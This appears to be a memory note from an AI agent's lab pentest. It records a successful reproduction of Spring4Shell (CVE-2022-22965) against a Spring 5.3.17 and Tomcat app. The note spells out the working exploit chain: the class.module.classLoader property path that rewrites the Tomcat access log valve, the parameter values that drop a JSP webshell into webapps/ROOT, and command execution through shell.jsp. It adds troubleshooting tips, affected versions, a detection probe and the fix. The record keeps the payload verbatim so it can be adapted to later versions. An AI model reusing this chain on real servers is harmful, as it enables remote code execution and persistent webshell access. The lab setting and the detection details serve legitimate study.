# Reproduced Spring4Shell (CVE-2022-22965) on a training Spring MVC + Tomcat app — property-binding → Tomcat access log JSP webshell.

Rollout context: cwd was `C:\Workspace\pentest-lab`, lab Tomcat 9 + Spring 5.3.17 + JDK 11 app (pre-patch, `WEB-INF/classes` write-able as Tomcat user). Target: standard Spring MVC form controller binding to a Java class.

## Task 1: DataBinder property chain → set Tomcat access log valve pattern → drop JSP webshell → RCE

Outcome: success

Preference signals:
- Chinese narration; commands in English.
- Wanted the full payload chain captured verbatim so future Spring versions can adapt.

Key steps:
- Confirmed Spring 5.3.17 + JDK 11 (JDK 9+ needed for the class.module.classLoader chain).
- Sent a form POST with parameters targeting `class.module.classLoader.resources.context.parent.pipeline.first.*`:
  - `pattern=%25%7Bc2%7Di if("j".equals(request.getParameter("pwd"))){...JSP...}` etc.
  - `suffix=.jsp`, `directory=webapps/ROOT`, `prefix=shell`, `fileDateFormat=`.
- Second request to trigger a log line write with the JSP payload; access log directory now contains `shell.jsp`.
- Browsed `/shell.jsp?pwd=j&cmd=id` → command output.

Failures and how to do differently:
- First attempts failed silently — Tomcat's AccessLogValve was configured to a non-writable directory. Had to use `directory=webapps/ROOT` explicitly.
- Some Spring versions need the `Content-Type: application/x-www-form-urlencoded` header explicitly.

Reusable knowledge:
- Spring4Shell requires: JDK 9+ (so `class.module.classLoader` chain resolves), Spring 5.3.x < 5.3.18 or 5.2.x < 5.2.20, deployed as WAR to Tomcat, form binding to a bean.
- Detection primitive: send innocuous property `class.module.classLoader.URLs[0]=1` — if the app returns 400 with "invalid property", the DataBinder is reachable.
- Fix in 5.3.18 / 5.2.20 explicitly denies the `class.module` prefix.
